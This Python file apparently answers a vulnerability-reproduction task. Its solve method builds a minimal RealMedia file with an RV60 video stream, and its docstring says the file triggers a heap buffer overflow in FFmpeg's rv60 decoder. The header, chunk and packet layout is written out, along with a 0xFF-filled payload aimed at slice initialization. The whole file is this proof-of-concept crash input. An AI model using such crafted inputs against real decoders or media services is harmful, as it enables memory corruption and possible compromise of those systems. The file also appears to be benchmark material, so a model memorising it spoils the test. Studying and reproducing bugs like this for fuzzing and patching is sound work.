import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow vulnerability in avcodec/rv60dec.
        The PoC mimics a minimal RealMedia (.rm) file containing an RV60 stream.
        """
        
        # 1. RMF Header (18 bytes)
        # Signature (.RMF), Version(0), HeaderSize(18), Flags(0), NumHeaders(4)
        rmf = struct.pack('>4sIIHI', b'.RMF', 0, 18, 0, 4)
        
        # 2. MDPR Chunk (82 bytes) - Media Properties
        # This chunk defines the stream type and codec.
        mime = b'video/x-pn-realvideo'
        
        # Codec Data (16 bytes) -> Passed to decoder extradata
        # Structure: Size(4), FourCC(4), Width(2), Height(2), Bpp(2), Pad(2)
        # FourCC 'RV60' ensures the vulnerable decoder is selected.
        codec_data = struct.pack('>I4sHHH2s', 16, b'RV60', 320, 240, 24, b'\x00\x00')
        
        # MDPR Body Fixed Fields (32 bytes)
        # Ver(2), Stream(2), MaxBit(4), AvgBit(4), MaxPkt(4), AvgPkt(4), Start(4), Pre(4), Dur(4)
        mdpr_fixed = struct.pack('>HHIIIIIII', 0, 0, 0, 0, 0, 0, 0, 0, 0)
        
        # MDPR Body Variable Fields
        # NameLen(1), MimeLen(1), MimeStr, TypeSpecLen(4), TypeSpecData
        mdpr_vars = struct.pack('BB', 0, len(mime)) + mime + struct.pack('>I', len(codec_data)) + codec_data
        
        mdpr_body = mdpr_fixed + mdpr_vars
        mdpr = b'MDPR' + struct.pack('>I', len(mdpr_body) + 8) + mdpr_body
        
        # 3. DATA Chunk (49 bytes)
        # This chunk contains the actual media packet.
        
        # Payload (22 bytes)
        # Designed to trigger the vulnerability in slice initialization.
        # We use high values (0xFF) to simulate large slice offsets or counts 
        # that cause the "initialize slice gb" logic to fail or calculate invalid sizes.
        payload = b'\xFF' * 8 + b'\x00' * 14
        
        # Packet Header (9 bytes content + 2 bytes length prefix)
        # Ver(2), Stream(2), Timestamp(4), Flags(1)
        pkt_hdr_content = struct.pack('>HHIB', 0, 0, 0, 2)
        
        # Packet length field includes the size of header content + payload
        pkt_len = len(pkt_hdr_content) + len(payload)
        packet = struct.pack('>H', pkt_len) + pkt_hdr_content + payload
        
        # DATA Chunk Body: NumPkts(4), NextData(4) + Packet
        data_body = struct.pack('>II', 1, 0) + packet
        data = b'DATA' + struct.pack('>I', len(data_body) + 8) + data_body
        
        # Total size: 18 + 82 + 49 = 149 bytes
        return rmf + mdpr + data
